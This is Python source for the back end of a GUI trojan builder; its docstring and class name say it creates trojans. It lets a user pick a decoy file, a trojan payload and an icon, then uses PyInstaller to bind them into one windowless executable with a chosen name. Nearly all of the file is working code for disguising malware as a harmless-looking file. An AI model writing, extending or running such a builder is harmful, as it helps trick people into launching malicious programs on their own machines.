'''
Gui界面的木马创造逻辑
'''


import sys
import GUIfunction.Pops.Dialogwin as Dialogwin
from PySide6.QtWidgets import QFileDialog
import shutil
import os
import subprocess

class Virus_creat:
    def __init__(self):
        self.vfile="None"

    #信息处理
    def cut_file(self,source_path, destination_path):
        """
        此函数用于将文件从源路径剪贴到目标路径
        :param source_path: 源文件的完整路径
        :param destination_path: 目标文件的完整路径
        :return: 操作成功返回 True，失败返回 False
        """
        try:
            # 检查源文件是否存在
            if os.path.exists(source_path):
                # 获取目标文件所在的目录
                destination_dir = os.path.dirname(destination_path)
                # 检查目标目录是否存在，如果不存在则创建
                if not os.path.exists(destination_dir):
                    os.makedirs(destination_dir)
                # 移动文件
                shutil.move(source_path, destination_path)
                print(f"文件已成功从 {source_path} 剪贴到 {destination_path}")
                return True
            else:
                print(f"源文件 {source_path} 不存在，无法进行剪贴操作。")
                return False
        except Exception as e:
            print(f"剪贴文件时出现错误: {e}")
            return False
    #///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    def select_file(self,win):
        #图形化查找文件路径
        file_path, _ = QFileDialog.getOpenFileName(win, "选择单个文件", "", "所有文件 (*.*);;文本文件 (*.txt)")
        return file_path

    def set_dfile(self,win,line):
        #设置伪装文件
        self.dfile=self.select_file(win)
        line.setText(self.dfile)


    def set_vfile(self,win,line):
        #设置木马文件
        self.vfile=self.select_file(win)
        line.setText(self.vfile)

    def set_icofile(self,win,line):
        #设置ico文件
        self.ico=self.select_file(win)
        line.setText(self.ico)

    def write_info(self,exe_butn,py_butn,name_butn):
        #写入配置文件
        if exe_butn.isChecked():
            self.type="exe"
        elif py_butn.isChecked():
            self.type="py"
        self.name=name_butn.text()
        with open("Trojans\\AnyType\\conf.txt","w") as f:
            f.write("dfile="+self.dfile+"\n")
            f.write("type="+self.type+"\n")
            f.write("ico="+self.ico+"\n")
            f.write("name="+self.name+"\n")
            f.write("vfile=" + self.vfile + "\n")

    def copy_files(self):
        #转移指定文件
        shutil.copyfile(self.dfile, "Trojans\\AnyType\\files\\"+os.path.basename(self.dfile))
        print(self.ico)
        print(self.dfile)
        if self.ico!=self.dfile:
            shutil.copyfile(self.ico,"Trojans\\AnyType\\files\\"+os.path.basename(self.ico))
        if self.type=="exe":
            shutil.copyfile(self.vfile, "Trojans\\AnyType\\files\\" + os.path.basename(self.vfile))

    def set_up_virus(self):
        # 要打包的 Python 脚本路径
        path=os.path.dirname(sys.argv[0])
        print(path)
        script_path = "muma_main.py"
        # 构建 PyInstaller 命令
        pycom = [
            'pyinstaller',
            '-F',  # 打包成单个可执行文件
            '-w',
            '-i',
            'files/'+os.path.basename(self.ico),
            '--add-data',
            'files/'+os.path.basename(self.dfile)+';files',
            '--add-data',
            'files/' + os.path.basename(self.ico) + ';files',
            '--add-data',
            'conf.txt;.',
            script_path
        ]

        execom = [
            'pyinstaller',
            '-F',  # 打包成单个可执行文件
            '-w',
            '-i',
            'files/' + os.path.basename(self.ico),
            '--add-data',
            'files/' + os.path.basename(self.dfile) + ';files',
            '--add-data',
            'files/' + os.path.basename(self.ico) + ';files',
            '--add-data',
            'files/' + os.path.basename(self.vfile) + ';files',
            '--add-data',
            'conf.txt;.',
            script_path
        ]
        # 执行打包命令
        if self.type=="py":
            subprocess.run(pycom, check=True,cwd=path+"\\Trojans\\AnyType")
        elif self.type=="exe":
            subprocess.run(execom, check=True, cwd=path + "\\Trojans\\AnyType")

    def remove_files(self):
        path = os.path.dirname(sys.argv[0]) + "\\Trojans\\AnyType\\files\\"
        os.remove(path + os.path.basename(self.dfile))
        if self.ico != self.dfile:
            os.remove(path + os.path.basename(self.ico))
        if self.type=="exe":
            os.remove(path + os.path.basename(self.vfile))


    def move_chengpin(self):
        path = os.path.dirname(sys.argv[0])
        self.cut_file(path+"\\Trojans\\AnyType\\dist\\"+"muma_main.exe",path+"\\results\\"+self.name+".exe")


    def creat_virus_start(self,exe_butn,py_butn,name_butn,win):
        Dialogwin.show_dialog(win, "点击开始生成目标，这可能需要一定时间!!!")
        self.write_info(exe_butn,py_butn,name_butn)
        self.copy_files()
        self.set_up_virus()
        self.remove_files()
        self.move_chengpin()
        Dialogwin.show_dialog(win, "目标生成成功!!!请进入results文件夹查看!!!!")





if __name__=="__main__":
    a=Virus_creat()
